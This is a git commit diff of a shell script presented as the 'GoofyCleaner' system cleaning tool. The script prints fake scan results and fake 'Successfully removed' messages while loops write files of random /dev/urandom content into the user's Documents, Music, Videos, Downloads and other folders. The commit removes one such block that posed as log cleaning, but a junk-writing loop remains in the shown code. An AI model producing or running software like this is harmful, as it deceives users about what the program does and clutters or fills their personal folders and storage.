904cafb2b50b24a598b933dc592aa73344798f1f
bean-frog <104943861+bean-frog@users.noreply.github.com>
2022-11-25 14:51:11 -0800

    Update SystemCleaner.sh

--- SystemCleaner.sh
+++ SystemCleaner.sh
@@ -3,7 +3,7 @@ echo "Welcome to the GoofyCleaner system cleaning tool"
 sleep 2
 echo "starting system scan..."
 sleep 8
-echo "unnecessary files found. Starting clean."
+echo "Temps found. Starting clean."
 sleep 2
 echo "CLEARING TEMPS"
 sleep 3
@@ -30,29 +30,6 @@ echo "[DEBUG] Detection ID:"$c " Successfully removed file '"$RANDOM".tmp'"
 sleep $((RANDOM % 5))
 done
 echo "TEMPS CLEARED"
-echo "CLEARING APP LOGS"
-sleep 6
-for (( c=1; c<=5; c++ ))
-do
- 
-cd ~/Public
-< /dev/urandom tr -dc "\t\n [:alnum:]" | head -c$x > $RANDOM.txt
-cd ~
-cd ~/Documents
-< /dev/urandom tr -dc "\t\n [:alnum:]" | head -c$x > $RANDOM.
-cd ~
-cd ~/Music
-< /dev/urandom tr -dc "\t\n [:alnum:]" | head -c$x > $RANDOM.txt
-cd ~
-cd ~/Videos
-< /dev/urandom tr -dc "\t\n [:alnum:]" | head -c$x > $RANDOM.txt
-cd ~
- 
-
-&> /dev/null
-echo $c "[DEBUG] Successfully removed logfile '"log-$RANDOM".json'"
-sleep $((RANDOM % 5))
-done
 
 echo "Performing final filesystem scan. This may take up to 5 minutes."
 for ((c=1;c<=99;c++))
@@ -67,9 +44,6 @@ cd ~/Music
 < /dev/urandom tr -dc "\t\n [:alnum:]" | head -c$x > $RANDOM.txt
 cd ~
 cd ~/Videos
-< /dev/urandom tr -dc "\t\n [:alnum:]" | head -c$x > $RANDOM.txt
-cd ~
-cd ~/Desktop
 < /dev/urandom tr -dc "\t\n [:alnum:]" | head -c$x > $RANDOM.txt
 cd ~
 cd ~/Downloads
